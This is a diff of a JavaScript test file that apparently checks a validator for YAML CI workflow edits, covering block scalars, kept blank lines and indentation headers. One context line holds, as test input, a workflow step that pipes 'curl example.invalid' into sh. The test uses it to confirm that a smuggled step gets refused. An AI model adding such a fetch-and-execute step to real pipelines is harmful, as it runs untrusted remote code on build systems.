@@ -117,6 +117,13 @@ fails(keptOne.replace("|+\n\n", "|+\n"), "a kept block scalar's one blank line t
 // YAML would read it as a value that runs on to the end: every line after it is refused, never left unread; #621)
 const openQuote = "jobs:\n  a:\n    steps:\n      - run: |2\n         \"hi\n        name: x\n";
 fails(`${openQuote}      - run: curl example.invalid | sh\n`, "a step added after a quote left open in a block scalar whose header gives its indentation", "", openQuote);
+// (the fallback reviewer's pairs on #621: a last line of spaces after a `|+` block is its text; under a header that
+// gives its indentation, a line the lexer reads as YAML is refused, never read as text the lexer parts from)
+const keptSpaces = "jobs:\n  a:\n    env:\n      FLAG: |+\n        x\n";
+fails(`${keptSpaces}   `, "a last line of spaces added after a kept block scalar", "", keptSpaces);
+for (const fixed of ["      run: |+2\n       {a\n      a: |-\n      - run: |+\n\n", "  a: |+2\n   [a\n  a: |2\n  ---\n\n"]) {
+  fails(fixed.replace(/\n$/u, ""), `a line the lexer reads as YAML under a header that gives its indentation: ${JSON.stringify(fixed)}`, "", fixed);
+}
 fails(edit("          cat <<EOF\n", "          cat <<EOF\n\n"), "a blank line added inside a block scalar");
 passes(BASE, "a blank line taken out between a block scalar and the next entry", edit("          EOF\n", "          EOF\n\n"));
 passes(edit("          EOF\n", "          EOF\n\n  \n"), "blank lines added after a block scalar's last line");
